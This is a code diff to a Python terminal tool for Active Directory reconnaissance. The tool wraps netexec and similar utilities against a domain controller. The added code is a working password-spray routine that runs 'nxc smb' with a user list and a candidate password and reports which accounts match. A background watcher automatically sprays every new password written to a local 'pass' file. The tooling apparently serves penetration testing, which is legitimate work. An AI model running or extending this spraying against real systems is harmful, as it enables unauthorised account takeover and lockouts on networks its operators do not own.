@@ -6,6 +6,7 @@ Wraps netexec/smbclient/impacket. Curses-based, no external deps.
 Usage: python3 recon_tui.py -t <dc-ip>
 """
 
+import os 
 import curses
 import threading
 import queue
@@ -262,15 +263,84 @@ def get_data_bloodhound_rusthound(app: App, target: str, domain: str = "", usern
     app.warn("Data saved in ./rusthound folder, Happy Graphing !")
     return
 
-def spec_users_pass():
-    return
+def pass_spray(app: App, target: str, domain: str = "", username: str="", password: str=""):
+    app.warn("pass spary triggered")
+    stdout, stderr, rc = run_cmd(["nxc", "smb", target, "-u", "users", "-p", password,"--continue-on-success"])
+
+    if rc == -1:
+        app.danger(f"Password spray failed to run: {stderr}")
+        return
+
+    matched_users = []
+    for line in stdout.splitlines():
+        if "[+]" in line:
+            m = re.search(r"\\(\S+):(\S*)", line)
+            if m:
+                matched_users.append(m.group(1))
+                app.danger(f"MATCH: user '{m.group(1)}' has password '{password}'")
+
+    if matched_users:
+        app.danger(f"Password spray complete — {len(matched_users)} match(es): {', '.join(matched_users)}")
+    else:
+        app.info("Password spray complete — no matches")
+    
+
+def monitor_users_pass(app: App, target: str, domain: str = "", username: str="", password: str=""):
+    """
+    Monitors 'users' and 'pass' files.
+    Prints only new content added to either file.
+    """
+    app.warn("Monitors 'users' and 'pass' files.")
+    interval=1
+    files = {
+        "users": 0,
+        "pass": 0
+    }
+
+    # Initialize current file positions
+    for filename in files:
+        if os.path.exists(filename):
+            files[filename] = os.path.getsize(filename)
+
+    while True:
+        for filename, last_size in files.items():
+
+            if not os.path.exists(filename):
+                continue
+
+            current_size = os.path.getsize(filename)
+
+            # Nothing new
+            if current_size <= last_size:
+                continue
+
+            try:
+                with open(filename, "r", encoding="utf-8", errors="ignore") as f:
+                    f.seek(last_size)
+                    new_content = f.read()
+
+                if filename=="pass":
+                    pass_spray(app, app.target, app.domain or "",app.username,new_content.strip())
+
+                # if new_content.strip():
+                #     app.info(f"\n[+] New content in {filename}:")
+                #     app.info("-" * 50)
+                #     app.info(new_content.strip())
+                #     app.info("-" * 50)
+
+                files[filename] = current_size
+
+            except OSError:
+                pass
+
+        time.sleep(interval)
 
 TASKS = {
     "smbnull": task_smb_null_session_enum,
     "getusers":user_enum_with_creds,
     "rusthound":get_data_bloodhound_rusthound,
-    "nxcbloodhound":get_data_bloodhound_nxc
-    # future: "ridcycle": task_rid_cycle, "shares": task_share_content, ...
+    "nxcbloodhound":get_data_bloodhound_nxc,
+    "monitor":monitor_users_pass    
 }
 
 
@@ -372,7 +442,7 @@ def main(stdscr, target_ip: str):
     # Kick off bootstrap immediately, in background, so UI is responsive
     # even while nxc is running.
     threading.Thread(target=task_bootstrap, args=(app, target_ip), daemon=True).start()
-
+    threading.Thread(target=monitor_users_pass, args=(app, target_ip), daemon=True).start()
     input_buf = ""
 
     while app.running:
